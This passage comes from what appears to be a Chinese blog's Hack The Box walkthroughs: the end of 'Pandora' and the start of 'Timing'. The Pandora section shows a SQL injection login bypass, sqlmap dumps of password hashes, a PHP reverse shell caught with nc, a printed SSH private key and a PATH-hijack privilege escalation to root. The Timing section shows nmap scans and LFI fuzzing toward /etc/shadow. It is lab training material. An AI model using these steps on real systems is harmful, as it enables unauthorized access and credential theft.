jecd4v8f6mlcgn4634ndfl74rd | id_usuario|s:6:&quot;daniel&quot;; | | knh7p9utl2089rprmm46nku2lr | id_usuario|s:5:&quot;admin&quot;;alert_msg|a:0:{}new_chat|b:0; | | kp90bu1mlclbaenaljem590ik3 | NULL | | l5817gd0prg6udd5sb5bufcvap | id_usuario|s:5:&quot;admin&quot;;alert_msg|a:0:{}new_chat|b:0; | | ne9rt4pkqqd0aqcrr4dacbmaq3 | NULL | | o3kuq4m5t5mqv01iur63e1di58 | id_usuario|s:6:&quot;daniel&quot;; | | og8c3bqae2pts9i0l6c3s2u9aq | NULL | | oi2r6rjq9v99qt8q9heu3nulon | id_usuario|s:6:&quot;daniel&quot;; | | pjp312be5p56vke9dnbqmnqeot | id_usuario|s:6:&quot;daniel&quot;; | | qh9k9iaginhd7qqu7sda2ar27o | id_usuario|s:6:&quot;daniel&quot;; | | qq8gqbdkn8fks0dv1l9qk6j3q8 | NULL | | r02qbtlhv3uq49mv0f4a3s4k8v | NULL | | r097jr6k9s7k166vkvaj17na1u | NULL | | rgku3s5dj4mbr85tiefv53tdoa | id_usuario|s:6:&quot;daniel&quot;; | | u5ktk2bt6ghb7s51lka5qou4r4 | id_usuario|s:6:&quot;daniel&quot;; | | u74bvn6gop4rl21ds325q80j0e | id_usuario|s:6:&quot;daniel&quot;; | | v0l5i5vhf7bsk2n3k2f90nu4bi | NULL | +----------------------------+------------------------------------------------------+ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# sqlmap -u &quot;http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=1&quot; --batch --dbms=mysql -D pandora -T tpassword_history -C id_pass,id_user,data_end,password,data_begin --dump +---------+---------+----------+----------------------------------+------------+ | id_pass | id_user | data_end | password | data_begin | +---------+---------+----------+----------------------------------+------------+ | 1 | matt | | f655f807365b6dc602b31ab3d6d43acc | | | 2 | daniel | | 76323c174bd49ffbbdedf678f6cc89a6 | | +---------+---------+----------+----------------------------------+------------+ é¦–å…ˆä½¿ç”¨å¦‚ä¸‹pocè¿›è¡Œè·³è¿‡ http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20SgGO ç„¶åç›´æ¥è®¿é—®http://127.0.0.1/pandora_console&#x2F;å³å¯ä»¥adminæƒé™è¿›è¡Œç™»å½• é€‰æ‹© Admin tools -&gt; File manager https://github.com/pentestmonkey/php-reverse-shell ä½¿ç”¨è¯¥shellï¼Œå…ˆä¿å­˜åˆ°æœ¬åœ°ç„¶åç¨å¾®ä¿®æ”¹ä¸€ä¸‹ ç„¶åupload fileä¸Šä¼  ä¼ ä¸Šå»ååœ¨http://127.0.0.1/pandora_console&#x2F;images&#x2F;phpshell.phpå¯ä»¥æ‰¾åˆ°shell æœ¬åœ°å¯åŠ¨ä¸€ä¸ªncç›‘å¬ç«¯å£ï¼Œç„¶åè®¿é—®è¯¥shell â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.17] from (UNKNOWN) [10.10.11.136] 58582 Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux 03:15:11 up 15 min, 4 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT daniel pts/0 10.10.14.17 03:00 14:23 0.03s 0.03s -bash daniel pts/1 10.10.14.20 03:01 11:35 0.26s 0.21s python3 sqlpwn.py -t localhost daniel pts/2 10.10.14.128 03:02 11.00s 0.20s 0.02s ssh -L 8000:localhost:80 daniel@pandora.htb daniel pts/4 127.0.0.1 03:14 15.00s 0.02s 0.02s -bash uid=1000(matt) gid=1000(matt) groups=1000(matt) /bin/sh: 0: can&#39;t access tty; job control turned off $ whoami&amp;&amp;id matt uid=1000(matt) gid=1000(matt) groups=1000(matt) æˆåŠŸæ‹¿åˆ°mattæƒé™çš„shell $ cat user.txt 083fe340ff06c9a855f56ee98eaa62fd æˆåŠŸæ‹¿åˆ°useræƒé™çš„flagæ–‡ä»¶ Rootmatt@pandora:/home/matt$ find / -perm -u=s 2&gt; /dev/null find / -perm -u=s 2&gt; /dev/null /usr/bin/sudo /usr/bin/pkexec /usr/bin/chfn /usr/bin/newgrp /usr/bin/gpasswd /usr/bin/umount /usr/bin/pandora_backup /usr/bin/passwd /usr/bin/mount /usr/bin/su /usr/bin/at /usr/bin/fusermount /usr/bin/chsh /usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/eject/dmcrypt-get-device /usr/lib/policykit-1/polkit-agent-helper-1 æ£€æŸ¥ä¸€ä¸‹å¯åˆ©ç”¨æ–‡ä»¶ å…¶ä¸­&#x2F;usr&#x2F;bin&#x2F;pandora_backupå¯åˆ©ç”¨ matt@pandora:/home/matt$ sudo /usr/bin/pandora_backup sudo /usr/bin/pandora_backup sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted sudo: unable to initialize policy plugin ç›´æ¥åˆ©ç”¨ä¼šé”™è¯¯ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ›´åŠ ç¨³å®šçš„shell ç”±äºæˆ‘ä»¬æ²¡æœ‰mattçš„å¯†ç ï¼Œæ‰€ä»¥æ— æ³•ç›´æ¥ç”¨sshç™»å½•ï¼Œä¹Ÿæ²¡æ‰¾åˆ°sshçš„ç§˜é’¥ï¼Œæ‰€ä»¥æˆ‘ä»¬è‡ªå·±ç”Ÿæˆä¸€ä¸ª matt@pandora:/home/matt$ ssh-keygen ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/home/matt/.ssh/id_rsa): Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /home/matt/.ssh/id_rsa Your public key has been saved in /home/matt/.ssh/id_rsa.pub The key fingerprint is: SHA256:SDMstiuKB3DRqypXDzX385OV0v8MrIh+lQE0alNduQ4 matt@pandora The key&#39;s randomart image is: +---[RSA 3072]----+ | . .+. ... | | . .. o... . | | .o.= + . . | |. ...+o=.. E . | |.. ....oS. * . | |. . o. o +.= | | o...o + +o. | |+.o. . ...+. o.| |+o .o.. .. +| +----[SHA256]-----+ matt@pandora:/home/matt$ cd .ssh cd .ssh matt@pandora:/home/matt/.ssh$ ls ls id_rsa id_rsa.pub matt@pandora:/home/matt/.ssh$ cat id_rsa.pub &gt; authorized_keys cat id_rsa &gt; authorized_keys matt@pandora:/home/matt/.ssh$ chmod 700 authorized_keys chmod 600 authorized_keys matt@pandora:/home/matt/.ssh$ cat id_rsa cat authorized_keys -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn NhAAAAAwEAAQAAAYEAwUKNz2Ov2tYQjOYPEreHt7g8wqnQaGJAkvpbi5+9r/T1iOXbq/hu EvBnHFk94YXL8UxwhTHzIoa0diY+XH+/eFwfi8cPTpn+yHtNMNmCOMtu7LBsM75UjAPqa2 56rfc+OVfWvayg6cdKXZ9tynO90Dfn5LxzyZxJDm59GKcDOY5Xip/s0YM41WvHxXjBfdZm hdVRsXGBCfe/kMqDQcWWqZ/CZsRa/ME7zjO04OQb9WEPrvluaXsykH1ckuhPuc9TXqNU/n lciexINkoC+RUT0eJtTRmeGU35v3L2VM4yckaaTLMp1jsJjSqQkkP46tr3wJoPmikmQHX8 02ssMv74mU3PKoIWREMG7HTXWakyQdhy2kuONnJGNu7VMKIrbBR/NTl5AKOPlZHeiXc+0u qRapeNvLoECvCTYGcJ0dsCcT78FhuIa2chFbL+vb7RMDmA6Q1ibLPj5hLZO6z+n/o3hJ4e 36SnXexYvVsvi8SmxWSo1B++vJck/xCRsUtOtlmpAAAFiAT0arUE9Gq1AAAAB3NzaC1yc2 EAAAGBAMFCjc9jr9rWEIzmDxK3h7e4PMKp0GhiQJL6W4ufva/09Yjl26v4bhLwZxxZPeGF y/FMcIUx8yKGtHYmPlx/v3hcH4vHD06Z/sh7TTDZgjjLbuywbDO+VIwD6mtueq33PjlX1r 2soOnHSl2fbcpzvdA35+S8c8mcSQ5ufRinAzmOV4qf7NGDONVrx8V4wX3WZoXVUbFxgQn3 v5DKg0HFlqmfwmbEWvzBO84ztODkG/VhD675bml7MpB9XJLoT7nPU16jVP55XInsSDZKAv kVE9HibU0ZnhlN+b9y9lTOMnJGmkyzKdY7CY0qkJJD+Ora98CaD5opJkB1/NNrLDL++JlN zyqCFkRDBux011mpMkHYctpLjjZyRjbu1TCiK2wUfzU5eQCjj5WR3ol3PtLqkWqXjby6BA rwk2BnCdHbAnE+/BYbiGtnIRWy/r2+0TA5gOkNYmyz4+YS2Tus/p/6N4SeHt+kp13sWL1b L4vEpsVkqNQfvryXJP8QkbFLTrZZqQAAAAMBAAEAAAGAYun0eQw1qpTbvbHWTyceUJr8hk myAGshT9jR2CG3TYLb1OiIyXkKpajjrW/Dq1T2sBcGlDWfkrFNVhd23ZMI5cqI3trQa9OH wwbQ2ErLStRcfspBZy5oSY2Lgtb19WpRL7pUj5n2dhDpcAe0guVAZnzmtHz76lmSTs+gOW jpzqCbD7mQ1R8LjLhwdBK9PfHpYWBwQpisifSC2NG94oEF/uVk84JWa31fZcezMVOvN6Up CM5jg5tpouh25D4A6EJDLT8F1fYxBRa2HdcX9rjhoabn+g0GTasUQfzBQAwAB5H2OX+xHm ICsG8Rl3FQdnRKSY4e9jsCT/ZcQRju07nSlzWfKWIkWT+kMYP6LejPgvwFNFQQHeLPM5rb epc1hCZ5XTCUyZXD0XSRqh8Am8H5ZY2ZfwrWwqxFSzRgnOV4gFm99V56WLDZ/Lzk5Cib4n OgBdqKzwifxY45GxcZD3Fp7sT0lPiGQaHROYzReg2BTtj7iPjUxNUmWw+G6sO66pDNAAAA wQDn6URSHsvxBnikQX8twCiwY1LDnrrrwZhm1f6R2yXpWD5//9HsRMCvYBy/14bp4O1b+l 1zuOwgKwJocfVXwJXhP8ui6PbbMHlknx+veZd9MzjeFmbYYJ5TAG5iyrLtJIapTf+nsg8z wKRhr8xEMiCKse0vsHlNrf7FrVzYC3RtM08jL0kb533gGMjmOUYkkIXZoIRCw1O1v8LysW 0YfOzmQLBhsqr1Kt08rIOGzI+Euk3lNHdT4Y4ruqP23RHruFkAAADBAPmPQmsR8V2N6hG3 8ko2jCLjBcRsBVnqPcdY/t1wdIZv0amcURk7Xgf6ZFsLjdte9TE3q6zivlFiI3QhnAPwuA sBpZum+36j/zdGuu4j2ZYcZ5iNybsTNv+h+vEILuY92i7IW9zxJOSBW42MFAKbe9ApHQbX ntYMXUShT3kOeccC9NBYBwcZurSokF8t915c8VV1Bl0y8polkPbV4eaRKhjQratrTTs7KC hKdFfzhxBWd12PCMQXORHbw103Yv7A7wAAAMEAxj9YaJ5qOY0W2SJjP1YizMAvDrYQw1kB FX/xjZDUclCXiXQ6HUSIbr6MIXZYTYTnOymDRM586hqd9hYlpM4E1dKsZK3dOX1/134FNE +k+iJLxmf89YWfjJRk6xo528B8KoDhtyh7C5uHC/DTGdyUlJHvscC9YAjt3ELsr3eeA1YP DHWXsucaZec6QfrteMEPJEVD2PRa5i1bAMjDTb4AVLGVLomR/Dnw4gLDtoujsTjSlxUY7g GeRu3MTcDq6d7nAAAADG1hdHRAcGFuZG9yYQECAwQFBg== -----END OPENSSH PRIVATE KEY----- â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# vim id_rsa â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# chmod 700 id_rsa â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# cat id_rsa -----BEGIN OPENSSH PRIVATE KEY----- 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 ç„¶åä½¿ç”¨sshè¿›è¡Œç™»å½• â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ssh matt@pandora.htb -i id_rsa Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue 18 Jan 05:59:56 UTC 2022 System load: 0.09 Processes: 280 Usage of /: 63.0% of 4.87GB Users logged in: 1 Memory usage: 9% IPv4 address for eth0: 10.10.11.136 Swap usage: 0% =&gt; /boot is using 91.8% of 219MB 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. matt@pandora:~$ whoami&amp;&amp;id matt uid=1000(matt) gid=1000(matt) groups=1000(matt) åˆ‡æ¢åˆ°mattçš„ç”¨æˆ·ç›®å½•ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªå‡çš„tarå¯æ‰§è¡Œæ–‡ä»¶ï¼Œï¼Œå¹¶å°†mattçš„å®¶è·¯å¾„æ³¨å…¥PATHå˜é‡ä¸­ cd /home/matt/ echo &quot;/bin/bash&quot; &gt; tar chmod +x tar export PATH=/home/matt:$PATH ç„¶åè¿è¡Œ&#x2F;usr&#x2F;bin&#x2F;pandora_backupæ–‡ä»¶ matt@pandora:~$ /usr/bin/pandora_backup PandoraFMS Backup Utility Now attempting to backup PandoraFMS client root@pandora:~# whoami&amp;&amp;id root uid=0(root) gid=1000(matt) groups=1000(matt) æˆåŠŸææƒåˆ°rootç”¨æˆ· root@pandora:~# cd /root root@pandora:/root# ls root.txt root@pandora:/root# cat root.txt 262d5cfca2599a11b0c1dcfa552a150e æˆåŠŸæ‹¿åˆ°rootæƒé™çš„flagæ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Timing - Hackthebox","slug":"Hackthebox - Timing","date":"2022-01-01T11:38:36.000Z","updated":"2023-05-20T03:17:57.000Z","comments":true,"path":"2022/01/01/Hackthebox - Timing/","link":"","permalink":"http://www.lucifiel.com/2022/01/01/Hackthebox%20-%20Timing/","excerpt":"","text":"Hackthebox - Timingé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†ä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.135 Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-14 00:09 EST Nmap scan report for bogon (10.10.11.135) Host is up (0.28s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA) | 256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA) |_ 256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=12/14%OT=22%CT=1%CU=39140%PV=Y%DS=2%DC=T%G=Y%TM=61B828 OS:78%P=x86_64-pc-linux-gnu)SEQ(SP=F8%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ OS:(SP=F9%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3 OS:=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=F OS:E88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O= OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W= OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 5900/tcp) HOP RTT ADDRESS 1 278.35 ms 10.10.14.1 2 278.35 ms bogon (10.10.11.135) OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 347.67 seconds å…ˆå»80ç«¯å£çœ‹çœ‹æ˜¯ä»€ä¹ˆæœåŠ¡ è¿™æ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œæµ‹è¯•ä¸€ä¸‹å¼±å£ä»¤æ²¡æœ‰çªç ´å£ï¼Œæ‰«ä¸€ä¸‹ç›®å½•çœ‹çœ‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ffuf -u &quot;http://10.10.11.135/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -e .php -fc 403 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.11.135/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt :: Extensions : .php :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response status: 403 ________________________________________________ login.php [Status: 200, Size: 5609, Words: 1755, Lines: 178] images [Status: 301, Size: 313, Words: 20, Lines: 10] index.php [Status: 302, Size: 0, Words: 1, Lines: 1] js [Status: 301, Size: 309, Words: 20, Lines: 10] css [Status: 301, Size: 310, Words: 20, Lines: 10] profile.php [Status: 302, Size: 0, Words: 1, Lines: 1] logout.php [Status: 302, Size: 0, Words: 1, Lines: 1] image.php [Status: 200, Size: 0, Words: 1, Lines: 1] upload.php [Status: 302, Size: 0, Words: 1, Lines: 1] header.php [Status: 302, Size: 0, Words: 1, Lines: 1] footer.php [Status: 200, Size: 3937, Words: 1307, Lines: 116] . [Status: 302, Size: 0, Words: 1, Lines: 1] db_conn.php [Status: 200, Size: 0, Words: 1, Lines: 1] :: Progress: [86006/86006] :: Job [1/1] :: 70 req/sec :: Duration: [0:17:21] :: Errors: 8 :: è¿™è¾¹æ²¡æœ‰è·³è½¬çš„åªæœ‰ä¸€ä¸ªimage.phpï¼Œä½†æ˜¯æ˜¯ç©ºç™½çš„ï¼ŒåŒæ—¶è¿˜å­˜åœ¨ä¸€ä¸ªimagesç›®å½•ï¼Œæˆ‘æ„Ÿè§‰è¿™é‡Œæœ‰ç‚¹é—®é¢˜ï¼Œå»çœ‹çœ‹imagesç›®å½•æœ‰å•¥ä¸œè¥¿ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ffuf -u &quot;http://10.10.11.135/images/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -e .php -fc 403 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.11.135/images/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt :: Extensions : .php :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response status: 403 ________________________________________________ uploads [Status: 301, Size: 321, Words: 20, Lines: 10] :: Progress: [86006/86006] :: Job [1/1] :: 78 req/sec :: Duration: [0:15:38] :: Errors: 4 :: ç›®å½•&#x2F;images&#x2F;uploads&#x2F;ç›®å½•ï¼Œç„¶åè¿˜å­˜åœ¨ä¸€ä¸ªimage.phpæ–‡ä»¶ï¼Œæˆ‘æ€»è§‰å¾—æ˜¯è¿™ä¸ªç›®å½•å†…çš„æ–‡ä»¶ï¼Œæ˜¯é€šè¿‡image.phpè¿™ä¸ªæ–‡ä»¶æ¥æŸ¥çœ‹çš„ï¼Œfuzzä¸€ä¸‹çœ‹çœ‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ffuf -u &quot;http://10.10.11.135/image.php?file=FUZZ&quot; -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.11.135/image.php?file=FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ /etc/httpd/logs/access.log [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/ftpchroot [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/grub.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/chrootUsers [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/apache2/apache2.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/shadow [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/fstab [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/hosts [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/httpd/logs/error_log [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/logrotate.d/proftpd [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/ftphosts [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/logrotate.d/ftp [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/groups [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/cron.deny [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/httpd/access.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/inetd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/httpd/srm.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/httpd/logs/access_log [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/cron.allow [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/at.allow [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/httpd/httpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/aliases [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/lighttpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/chttp.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/php/apache/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/issue [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/anacrontab [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/passwd [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/httpd/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/mysql/my.cnf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/lilo.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/npasswd [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/profile [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/crontab [Status: 